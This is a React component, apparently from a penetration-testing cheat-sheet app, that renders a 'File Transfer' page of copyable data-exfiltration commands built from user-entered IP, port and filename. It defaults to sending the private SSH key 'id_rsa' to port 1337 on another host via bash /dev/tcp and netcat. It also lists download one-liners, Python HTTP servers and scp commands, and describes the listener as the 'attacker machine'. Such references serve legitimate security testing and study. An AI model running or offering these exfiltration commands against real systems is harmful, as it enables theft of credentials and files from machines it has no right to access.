import React, { useState } from "react";
import { Typography, Row, Col, Divider, Input } from "antd";
import {
  WifiOutlined,
  createFromIconfontCN,
  FolderOutlined,
} from "@ant-design/icons";
import QueueAnim from "rc-queue-anim";

const { Title, Paragraph, Text } = Typography;
const IconFont = createFromIconfontCN({
  scriptUrl: ["./iconfont.js"],
});

export default (props) => {
  const [values, setValues] = useState({
    ip: "10.10.164.167",
    port: "1337",
    file_name: "id_rsa",
  });
  const handleChange = (name) => (event) => {
    setValues({ ...values, [name]: event.target.value });
  };
  const bash_transfer = `
    bash -c 'echo -e "POST / HTTP/0.9\n\n$(<${values.file_name})" > /dev/tcp/${values.ip}/${values.port}'
    `;
  const bash_tcp_transfer = ` 
    bash -c 'cat ${values.file_name} > /dev/tcp/${values.ip}/${values.port}'
    `;
  const bash_download = `bash -c 'cat < /dev/tcp/${values.ip}/${values.port} > ${values.file_name}'`;
  const netcat_transfer = `nc ${values.ip} ${values.port} < ${values.file_name}`;
  const python_server = `python3 -m http.server ${values.port}`;
  const python2_server = `python -m SimpleHTTPServer ${values.port}`;
  const scp = `scp ${values.file_name} username@${
    values.ip || "IP"
  }:~/destination ${values.port && "-P " + values.port}`;
  const scp_dl = `scp user@${values.ip || "IP"}:~/path_to_file file_saved ${
    values.port && "-P " + values.port
  }`;

  return (
    <QueueAnim delay={300} duration={1500}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        File Transfer
      </Title>
      <Paragraph style={{ margin: 15 }}>
        Various method of data exfiltration and download from a remote machine.
      </Paragraph>
      <div style={{ padding: 15 }}>
        <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
          <Col span={8}>
            <Input
              maxLength={15}
              prefix={<WifiOutlined />}
              name='Ip adress'
              placeholder='IP Address or Host (ex: 212.212.111.222)'
              onChange={handleChange("ip")}
            />
          </Col>
          <Col span={8}>
            <Input
              maxLength={4}
              prefix={<IconFont type='icon-Network-Plug' />}
              name='Port'
              placeholder='Port (ex: 1337)'
              onChange={handleChange("port")}
            />
          </Col>
          <Col span={8}>
            <Input
              prefix={<FolderOutlined />}
              name='File name'
              placeholder='Filename (ex: script.sh)'
              onChange={handleChange("file_name")}
            />
          </Col>
        </Row>
      </div>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='a'>
        <Title level={3}>
          Bash Upload <IconFont type='icon-gnubash' />
        </Title>
        <Text strong>
          # Upload file over HTTP (require HTTP service running on the attacker
          machine)
        </Text>
        <Paragraph copyable ellipsis={true}>
          {bash_transfer}
        </Paragraph>
        <Text strong style={{ marginTop: "1em" }}>
          # Exfiltrate file over TCP
        </Text>
        <Text strong style={{ marginTop: "1em" }}>
          # Listen with Netcat on port {values.port} + output redirection
        </Text>
        <Paragraph copyable>
          nc -l -p {values.port} {">"} data
        </Paragraph>
        <Paragraph copyable ellipsis={true}>
          {bash_tcp_transfer}
        </Paragraph>
        <Title level={3}>
          Bash Download <IconFont type='icon-gnubash' />
        </Title>
        <Text strong># Send via netcat</Text>
        <Paragraph copyable ellipsis={true}>
          nc -l -p {values.port} {"<"} {values.file_name}
        </Paragraph>
        <Text strong># Download file on the other machine</Text>
        <Paragraph copyable ellipsis={true}>
          {bash_download}
        </Paragraph>
      </div>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='b'>
        <Title level={3}>
          Netcat <IconFont type='icon-command-line' />
        </Title>
        <Text strong># Upload payload</Text>
        <Paragraph>nc -lnvp {values.port}</Paragraph>
        <Paragraph copyable ellipsis={true}>
          {netcat_transfer}
        </Paragraph>
        <Text strong style={{ marginTop: "2em" }}>
          # Download
        </Text>
        <Paragraph copyable ellipsis>
          nc {values.ip} {values.port} {"<"} {values.file_name}
        </Paragraph>
        <Paragraph copyable ellipsis>
          nc -lnvp {values.port} {">"} file_saved
        </Paragraph>
      </div>
      <Divider dashed />
      <div
        key='e'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Python <IconFont type='icon-python' />
        </Title>
        <Text strong># Python3 HTTP Server</Text>
        <Paragraph copyable ellipsis={true} style={{ marginBottom: "1em" }}>
          {python_server}
        </Paragraph>
        <Text strong># Python2 HTTP Server</Text>
        <Paragraph copyable ellipsis>
          {python2_server}
        </Paragraph>
      </div>
      <Divider dashed />
      <div
        key='f'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          SCP <IconFont type='icon-filelock' />
        </Title>
        <Text strong># Upload from local host to remote computer</Text>
        <Paragraph copyable ellipsis={true} style={{ marginBottom: "1em" }}>
          {scp}
        </Paragraph>
        <Text strong># Download from remote computer</Text>
        <Paragraph copyable ellipsis={true} style={{ marginBottom: "1em" }}>
          {scp_dl}
        </Paragraph>
      </div>
    </QueueAnim>
  );
};
